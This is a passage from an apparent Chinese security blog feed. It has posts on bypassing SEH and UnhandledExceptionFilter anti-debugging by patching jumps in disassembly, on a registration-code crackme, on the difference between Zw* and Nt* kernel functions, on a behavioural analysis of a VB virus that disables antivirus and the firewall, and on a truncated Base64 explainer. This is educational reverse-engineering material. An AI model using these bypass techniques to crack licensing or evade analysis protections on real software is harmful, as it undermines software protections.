color="#DC143C">由于设定的UnhandledExceptionFilter函数只有在调试器没有加载的时候才会被系统调用，这里巧妙地使用了系统的这个功能来保护代码.</font></strong></p><h1 id="第四部分：绕过SEH反调试："><a href="#第四部分：绕过SEH反调试：" class="headerlink" title="第四部分：绕过SEH反调试："></a>第四部分：绕过SEH反调试：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于第一种，只需要在IsPresnetDebug()返回时修改判断即可。或者直接修改FS:[18]中的debuged成员为“0”。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于第二种，因为UnhandledExceptionFilter是否调用取决于系统内核的判断。用户态的调试器要想改变这个行为，要破费一番脑筋了。</p><pre><code>2018年1月25日夜于汉阴</code></pre><h1 id="第五部分：利用SEH保护验证码"><a href="#第五部分：利用SEH保护验证码" class="headerlink" title="第五部分：利用SEH保护验证码"></a>第五部分：利用SEH保护验证码</h1><p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们看到这个一个MSAM汇编编译而成的程序，如图所示，程序对输入的用户名长度做出验证，正确长度是4-30个字节，<br>    <img src="https://i.imgur.com/zt2j9iL.png" alt=""><br>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果正确，则跳入SEH安装程序，输入注册码。输入完毕后，给出一个int 3软件异常，跳入SEH处理函数。<br>    <img src="https://i.imgur.com/8GlJtRr.png" alt=""><br>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个SEH处理函数，是一个验证注册码正确的的函数，关于验证过程，本文不做介绍。<br>    <img src="https://i.imgur.com/EPMGJsa.png" alt=""><br>4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;快速到达SEH处理函数的方法，如图所是，栈顶是下一个处理函数的指针，下面红圈所是个这次处理函数的指针。<br>    <img src="https://i.imgur.com/wuFfm7I.png" alt=""><br>5.备注，测试用例：<br>    <a href="https://pan.baidu.com/s/1htLY6ag" title="测试用例" target="_blank" rel="external">https://pan.baidu.com/s/1htLY6ag</a></p><h1 id="第六部分：利用SetUnhandledExceptionFilter和UnhandledExceptionFileter函数实现反调试"><a href="#第六部分：利用SetUnhandledExceptionFilter和UnhandledExceptionFileter函数实现反调试" class="headerlink" title="第六部分：利用SetUnhandledExceptionFilter和UnhandledExceptionFileter函数实现反调试"></a>第六部分：利用SetUnhandledExceptionFilter和UnhandledExceptionFileter函数实现反调试</h1><p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;异常时，系统处理异常的顺序</p><ul><li>发生异常时系统的处理顺序(by Jeremy Gordon, Hume): <ul><li>1.系统首先判断异常是否应发送给目标程序的异常处理例程,如果决定应该发送,并且目标程序正在被调试,则系统 挂起程序并向调试器发送EXCEPTION_DEBUG_EVENT消息.</li><li>2.如果你的程序没有被调试或者调试器未能处理异常,系统就会继续查找你是否安装了线程相关的异常处理例程,如果 你安装了线程相关的异常处理例程,系统就把异常发送给你的程序seh处理例程,交由其处理. </li><li>3.每个线程相关的异常处理例程可以处理或者不处理这个异常,如果他不处理并且安装了多个线程相关的异常处理例程, 可交由链起来的其他例程处理. </li><li>4.如果这些例程均选择不处理异常,如果程序处于被调试状态,操作系统仍会再次挂起程序通知debugger. </li><li>5.如果程序未处于被调试状态或者debugger没有能够处理,并且你调用SetUnhandledExceptionFilter安装了最后异 常处理例程的话,系统转向对它的调用. </li><li>6.如果你没有安装最后异常处理例程或者他没有处理这个异常,系统会调用默认的系统处理程序,通常显示一个对话框, 你可以选择关闭或者最后将其附加到调试器上的调试按钮.如果没有调试器能被附加于其上或者调试器也处理不了,系统 就调用ExitProcess终结程序. </li><li>7.不过在终结之前,系统仍然对发生异常的线程异常处理句柄来一次展开,这是线程异常处理例程最后清理的机会.</li><li>8.UnhandledExceptionFileter是系统最好一个异常 处理器(就是程序崩溃时候，出现的windows的提示框)。</li></ul></li></ul><p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本例样本网络上找不到了，截取前辈的数据。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">77C01269 &gt;  <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span>////以下用F8走。</div><div class="line">77C0126A    8BEC            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line"> 77C0126C    <span class="number">51</span>              <span class="keyword">push</span> <span class="built_in">ecx</span></div><div class="line"> 77C0126D    <span class="number">53</span>              <span class="keyword">push</span> <span class="built_in">ebx</span></div><div class="line"> 77C0126E    <span class="number">56</span>              <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line"> 77C0126F    <span class="number">57</span>              <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line"> 77C01270    E8 DD680000     <span class="keyword">call</span> 77C07B52                          <span class="comment">; 77C07B52</span></div><div class="line"> 77C01275    8B7D <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">8</span>]</div><div class="line"> 77C01278    8BF0            <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div><div class="line"> 77C0127A    8B56 <span class="number">54</span>         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">54</span>]</div><div class="line"> 77C0127D    A1 94A7C277     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[77C2A794]</div><div class="line"> 77C01282    8BCA            <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">edx</span></div><div class="line"> 77C01284    <span class="number">3939</span>            <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>],<span class="built_in">edi</span></div><div class="line"> 77C01286    <span class="number">74</span> <span class="number">0D</span>           <span class="keyword">je</span> short 77C01295                      <span class="comment">; 77C01295</span></div><div class="line"> 77C01288    8D1C40          <span class="keyword">lea</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="built_in">eax</span>*<span class="number">2</span>]</div><div class="line"> 77C0128B    83C1 0C         <span class="keyword">add</span> <span class="built_in">ecx</span>,0C</div><div class="line"> 77C0128E    8D1C9A          <span class="keyword">lea</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="built_in">ebx</span>*<span class="number">4</span>]</div><div class="line"> 77C01291    3BCB            <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">ebx</span></div><div class="line"> 77C01293  ^ <span class="number">72</span> EF           <span class="keyword">jb</span> short 77C01284                      <span class="comment">; 77C01284</span></div><div class="line"> 77C01295    8D0440          <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="built_in">eax</span>*<span class="number">2</span>]////F4下来。</div><div class="line">77C01298    8D0482          <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="built_in">eax</span>*<span class="number">4</span>]</div><div class="line"> 77C0129B    3BC8            <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">eax</span></div><div class="line"> 77C0129D    <span class="number">73</span> <span class="number">04</span>           <span class="keyword">jnb</span> short 77C012A3                     <span class="comment">; 77C012A3</span></div><div class="line"> 77C0129F    <span class="number">3939</span>            <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>],<span class="built_in">edi</span></div><div class="line"> 77C012A1    <span class="number">74</span> <span class="number">02</span>           <span class="keyword">je</span> short 77C012A5                      <span class="comment">; 77C012A5</span></div><div class="line"> 77C012A3    33C9            <span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span></div><div class="line"> 77C012A5    85C9            <span class="keyword">test</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span></div><div class="line"> 77C012A7    0F84 <span class="number">12010000</span>   <span class="keyword">je</span> 77C013BF ////这里跳！</div><div class="line">77C012AD    8B59 <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">8</span>]</div><div class="line"> 77C012B0    85<span class="built_in">DB</span>            <span class="keyword">test</span> <span class="built_in">ebx</span>,<span class="built_in">ebx</span></div><div class="line"> 77C012B2    <span class="number">895D</span> <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="built_in">ebx</span></div><div class="line"> 77C012B5    0F84 <span class="number">04010000</span>   <span class="keyword">je</span> 77C013BF                            <span class="comment">; 77C013BF</span></div><div class="line"> 77C012BB    83FB <span class="number">05</span>         <span class="keyword">cmp</span> <span class="built_in">ebx</span>,<span class="number">5</span></div><div class="line"> 77C012BE    <span class="number">75</span> 0C           <span class="keyword">jnz</span> short 77C012CC                     <span class="comment">; 77C012CC</span></div></pre></td></tr></table></figure></p><p>跳到:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">77C013BF    FF75 0C         <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+C]////跳到这里。</div><div class="line">77C013C2    FF15 C011BE77   <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[77BE11C0] <span class="comment">; kernel32.UnhandledExceptionFilter</span></div><div class="line"> 77C013C8    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></div><div class="line"> 77C013C9    5E              <span class="keyword">pop</span> <span class="built_in">esi</span></div><div class="line"> 77C013CA    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></div><div class="line"> 77C013CB    C9              <span class="keyword">leave</span></div><div class="line"> 77C013CC    C3              <span class="keyword">retn</span></div></pre></td></tr></table></figure></p><p>跳到77C013BF后就可以发现开始调用UnhandledExceptionFilter了!!!<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"> 77E730C0 &gt;  <span class="number">68</span> <span class="number">00050000</span>      <span class="keyword">push</span> <span class="number">500</span></div><div class="line"> 77E730C5    <span class="number">68</span> F852E777     <span class="keyword">push</span> 77E752F8</div><div class="line"> 77E730CA    E8 0972FEFF     <span class="keyword">call</span> 77E5A2D8                          <span class="comment">; 77E5A2D8</span></div><div class="line"> 77E730CF    C745 E4 <span class="number">0400000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-1C],<span class="number">4</span></div><div class="line"> 77E730D6    8B7D <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">8</span>]</div><div class="line"> 77E730D9    8B07            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>]</div><div class="line"> 77E730DB    BB 050000C0     <span class="keyword">mov</span> <span class="built_in">ebx</span>,C0000005</div><div class="line"> 77E730E0    33F6            <span class="keyword">xor</span> <span class="built_in">esi</span>,<span class="built_in">esi</span></div><div class="line"> 77E730E2    <span class="number">3918</span>            <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="built_in">ebx</span></div><div class="line"> 77E730E4    <span class="number">75</span> <span class="number">09</span>           <span class="keyword">jnz</span> short 77E730EF                     <span class="comment">; 77E730EF</span></div><div class="line"> 77E730E6    <span class="number">3970</span> <span class="number">14</span>         <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">14</span>],<span class="built_in">esi</span></div><div class="line"> 77E730E9    0F85 77DC0000   <span class="keyword">jnz</span> 77E80D66                           <span class="comment">; 77E80D66</span></div><div class="line"> 77E730EF    <span class="number">8975</span> E0         <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>],<span class="built_in">esi</span></div><div class="line"> 77E730F2    <span class="number">56</span>              <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line"> 77E730F3    6A <span class="number">04</span>           <span class="keyword">push</span> <span class="number">4</span></div><div class="line"> 77E730F5    8D45 E0         <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>]</div><div class="line"> 77E730F8    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"> 77E730F9    6A <span class="number">07</span>           <span class="keyword">push</span> <span class="number">7</span></div><div class="line"> 77E730FB    E8 B9B5FEFF     <span class="keyword">call</span> 77E5E6B9////调用GetCurrentProcess，返回hProcess。</div><div class="line">77E73100    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"> 77E73101    FF15 AC10E477   <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[77E410AC]////调用ntdll.ZwQueryInformationProcess。晕，调用好多次!</div><div class="line">77E73107    85C0            <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>////<span class="built_in">EAX</span>=<span class="number">0</span>则表示成功，否则失败。</div><div class="line">77E73109    7C <span class="number">09</span>           <span class="keyword">jl</span> short 77E73114</div><div class="line"> 77E7310B    <span class="number">3975</span> E0         <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>],<span class="built_in">esi</span>////[<span class="built_in">ebp</span>-<span class="number">20</span>]=－<span class="number">1</span>，则表示有调试器，=<span class="number">0</span>表示没调试器。</div><div class="line">77E7310E    0F85 C5060000   <span class="keyword">jnz</span> 77E737D9////这里不能跳，跳则表示有调试器。干脆<span class="keyword">NOP</span>掉!</div><div class="line">77E73114    A1 B473EB77     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[77EB73B4]</div><div class="line"> 77E73119    3BC6            <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="built_in">esi</span></div><div class="line"> 77E7311B    <span class="number">74</span> <span class="number">15</span>           <span class="keyword">je</span> short 77E73132</div><div class="line"> 77E7311D    <span class="number">57</span>              <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line"> 77E7311E    FFD0            <span class="keyword">call</span> <span class="built_in">eax</span>////F7进入!</div><div class="line">77E73120    83F8 <span class="number">01</span>         <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="number">1</span></div><div class="line"> 77E73123    0F84 E9030000   <span class="keyword">je</span> 77E73512                            <span class="comment">; 77E73512</span></div></pre></td></tr></table></figure></p><p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong><font color="#DC143C">总结：在第四部分中我说了，对于第二种方法，属于内核级调试，不容易绕过，但是这个例子给了我们一个思路:由于反调试代码UnhandledExceptionFilter函数内部，我们可以跟进函数内部，把里面的判断给误导了，就可以顺利通过反调试。</font></strong></p><pre><code>2018年1月26日夜于汉阴</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;SEH(“Structured Exception Handling”),即结构化异常处理·是(windows)操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。它不依托于设计语言，只依托于操作系统，这些并不是编译程序本身所固有的,本质上只不过是对windows内在提供的结构化异常处理的包装。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;参看资料：&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;1.逆向工程核心原理&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;2.&lt;a href=&quot;https://www.52pojie.cn/thread-16609-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.52pojie.cn/thread-16609-1-1.html&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;3.&lt;a href=&quot;https://bbs.pediy.com/thread-27224.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://bbs.pediy.com/thread-27224.html&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;4.&lt;a href=&quot;https://bbs.pediy.com/thread-12449.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://bbs.pediy.com/thread-12449.htm&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;5.&lt;a href=&quot;https://bbs.pediy.com/thread-189193.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://bbs.pediy.com/thread-189193.htm&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Zw*与Nt*的区别</title>
    <link href="http://yoursite.com/2018/01/23/%E5%86%85%E6%A0%B8Nt%E5%92%8CZw%E5%87%BD%E6%95%B0%E5%8C%BA%E5%88%AB/"/>
    <id>http://yoursite.com/2018/01/23/内核Nt和Zw函数区别/</id>
    <published>2018-01-23T07:02:11.000Z</published>
    <updated>2018-01-23T11:01:19.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-在用户态"><a href="#1-在用户态" class="headerlink" title="1:在用户态"></a>1:在用户态</h1><p>1：以ReadFile为例：ntdll.dll导出了ZwReadFile和NtReadFile </p><p><strong>2.不管你调用ZwReadFile还是NtReadFile都是一样的</strong></p><p>3.因为他们是同一个函数的两个不同名称而已…. 而且他们最终都会调用到ntoskrnl中的NtReadFile中去。<br><a id="more"></a></p><h1 id="2-在内核态"><a href="#2-在内核态" class="headerlink" title="2:在内核态"></a>2:在内核态</h1><p>1：ntoskrnl.exe导出了ZwReadFile和NtReadFile<br><strong>2：Ntoskrnl导出的NtReadFile是真正的执行函数，ZwReadFile是一个stub函数</strong><br>3：区别：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内核态调用ZwReadFile，会将Previous Mode设置为Kernel Mode，然后再调用NtReadFile。而在内核态直接调用NtReadFile，不会改变Previous Mode。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NtReadFile中会检测当前调用来自用户态还是内核态。如果是来自内核态，不会检测参数；而如果是来自用户态，就会做一系列的参数检测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们知道，内核组件可能运行在任意进程的上下文中，当它调用NtReadFile时，因为Previous Mode很可能是User Mode，而我们的参数请求的内核态的地址，这时通常就会产 STATUS_ACCESS_VIOLATION 错误 。</p><p><strong>所以内核态一般用Zw*系列的函数</strong></p><p><a href="http://www.osronline.com/article.cfm?id=257" title="关于Nt*与Zw*的更为详细的介绍" target="_blank" rel="external">http://www.osronline.com/article.cfm?id=257</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-在用户态&quot;&gt;&lt;a href=&quot;#1-在用户态&quot; class=&quot;headerlink&quot; title=&quot;1:在用户态&quot;&gt;&lt;/a&gt;1:在用户态&lt;/h1&gt;&lt;p&gt;1：以ReadFile为例：ntdll.dll导出了ZwReadFile和NtReadFile &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.不管你调用ZwReadFile还是NtReadFile都是一样的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;3.因为他们是同一个函数的两个不同名称而已…. 而且他们最终都会调用到ntoskrnl中的NtReadFile中去。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术（1)</title>
    <link href="http://yoursite.com/2018/01/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(1)/"/>
    <id>http://yoursite.com/2018/01/12/病毒分析技术(1)/</id>
    <published>2018-01-12T07:02:11.000Z</published>
    <updated>2018-01-12T15:11:14.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;越到考试我越浪，今天就正式更新第一篇关于病毒分析技术的文章，第一次分析，关于病毒的了解不够深入。有些分析不到位，尽请谅解。病毒样本来自卡饭社区。<br><a id="more"></a></p><h1 id="病毒行为分析："><a href="#病毒行为分析：" class="headerlink" title="病毒行为分析："></a>病毒行为分析：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先是对病毒的行为分析，分析过程在win7的虚拟机下进行。打开火绒剑，开启行为监测。运行病毒程序，发现样本的特殊行为如下</p><ul><li>1）在系统Temp目录创建文件，达到隐藏自身的目的：<br>  <img src="https://i.imgur.com/QdsGxRf.png" alt=""></li><li>2）执行创建的文件，病毒开始发挥作用。<br>  <img src="https://i.imgur.com/V7bWqUA.png" alt=""></li><li>3）打开explorer，目标路径是我的文档，显示文件无法访问，可能是病毒把代码注入explorer文件，并且启动进程。第二点：调用cmd，以进行下一步操作，同时达到隐藏自身的作用。<br>  <img src="https://i.imgur.com/X6xNFSH.png" alt=""><br>  <img src="https://i.imgur.com/KBe5Lhs.png" alt=""></li></ul><h1 id="病毒静态分析："><a href="#病毒静态分析：" class="headerlink" title="病毒静态分析："></a>病毒静态分析：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查壳，没有加壳。发现使用VB写的老病毒了，上神器VB_Decompiler。</p><ul><li>0）检测杀毒软件，通过检测进程名称识别，然后调用cmd命令关闭防护进程。<br>  <img src="https://i.imgur.com/X4W9SER.png" alt=""></li><li>1）此处利用shell函数，以脚本的形式调用资源管理器。<br>  <img src="https://i.imgur.com/utdS11I.png" alt=""></li><li>2）在前一个时间检测本地系统环境，获取时间，精确到毫秒级。修改注册表项，实现病毒的自启动。<br>  <img src="https://i.imgur.com/SGsy7Wf.png" alt=""></li><li>3）检测本地的用户是否是管理员，然后检测防火墙的状态，如果防火墙处于打开状态，关闭它，然后下载FTP服务器下的内容。<ul><li>3.1）通过写入注册表项，关闭防火墙!<br><img src="https://i.imgur.com/w0Rs61K.png" alt=""></li><li>3.2)远程从FTP服务器中下载指定的内容<br><img src="https://i.imgur.com/bsFXWwO.png" alt=""></li></ul></li><li>4）黑客远程FTP服务器地址如下：此时已经无法访问这个FTP了。<br>  <img src="https://i.imgur.com/PAGfm2J.png" alt=""></li><li>5）网上爬取xml框架内容，构建一个全新的xml框架【猜测】<br>  <img src="https://i.imgur.com/WAGvzIb.png" alt=""></li><li>6）设置特殊文件的属性，目标文件是winservice和winsystem</li></ul><h1 id="专业分析系统的分析："><a href="#专业分析系统的分析：" class="headerlink" title="专业分析系统的分析："></a>专业分析系统的分析：</h1><p> <a href="https://habo.qq.com/file/showdetail?md5=bf5366660d7629f1fdf5b94921c824e6&amp;pk=ADMGYl1lB2EIMFs8" target="_blank" rel="external">https://habo.qq.com/file/showdetail?md5=bf5366660d7629f1fdf5b94921c824e6&amp;pk=ADMGYl1lB2EIMFs8</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;越到考试我越浪，今天就正式更新第一篇关于病毒分析技术的文章，第一次分析，关于病毒的了解不够深入。有些分析不到位，尽请谅解。病毒样本来自卡饭社区。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈Base64的加密原理及其应用</title>
    <link href="http://yoursite.com/2017/12/24/%E6%B5%85%E8%B0%88Base64%E7%9A%84%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    <id>http://yoursite.com/2017/12/24/浅谈Base64的加密与解密/</id>
    <published>2017-12-24T06:02:11.000Z</published>
    <updated>2017-12-24T07:57:36.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="总括："><a href="#总括：" class="headerlink" title="总括："></a>总括：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>本篇文章主要介绍关于Base64的加密原理，加密函数，及其应用。</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Base64编码，是我们程序开发中经常使用到的编码方法。它是一种基于用64个可打印字符来表示二进制数据的表示方法。它其实只是定义用可打印字符传输内容一种方法，并不会产生新的字符集。</strong><br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考博客主要有:<br><a href="http://blog.csdn.net/aozeahj/article/details/52507352" target="_blank" rel="external">http://blog.csdn.net/aozeahj/article/details/52507352</a><br><a href="https://www.cnblogs.com/yejianfei/archive/2013/04/06/3002838.html" target="_blank" rel="external">https://www.cnblogs.com/yejianfei/archive/2013/04/06/3002838.html</a></p><h1 id="Base64的加密原理："><a href="#Base64的加密原理：" class="headerlink" title="Base64的加密原理："></a>Base64的加密原理：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们取字符0-9，A-Z,a-z，以及”+”和”/“组成一个63个不同的字符集。分别对这64个字符做好编号，对应的索引如下：<br>    <img src="https://i.imgur.com/1iUqXjk.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先我们按照如上的编号，写出一个8位二进制的数据，然后把它分成一个6位二进制的分组。再按照编号组成一个新的字符。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以上是一个一般情况。我们找出一个编码和译码的最优情况：首先，一个字符进行编码成一个8位二进制的数据。然后进行译码要把这8位二进制组成6位二进制，但是这势必会造成2位二进制数据的丢失，我们取8和6的最小公倍数即24的整数倍就不会造成数据位的丢失情况。如下图：<br>    <img src="https://i.imgur.com/3nDyh9t.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是我们无法保证每个字符串都能保证24的整数倍的<strong>位长度</strong>，在编码的时候很有可能无法凑够6位数字，但是Base64已经替我们想到了解决方案，即使用凑0的方案，不够6的整数倍的数据补0。但是不够24的数据使用“=”即可。这就是我们进行编码的时候，有时候在结尾出现1个”=”或者2个”=”的情况。<br>    <img src="https://i.imgur.com/0bVoKk2.png" alt=""></p><h1 id="Base64的加密函数："><a href="#Base64的加密函数：" class="headerlink" title="Base64的加密函数："></a>Base64的加密函数：</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div 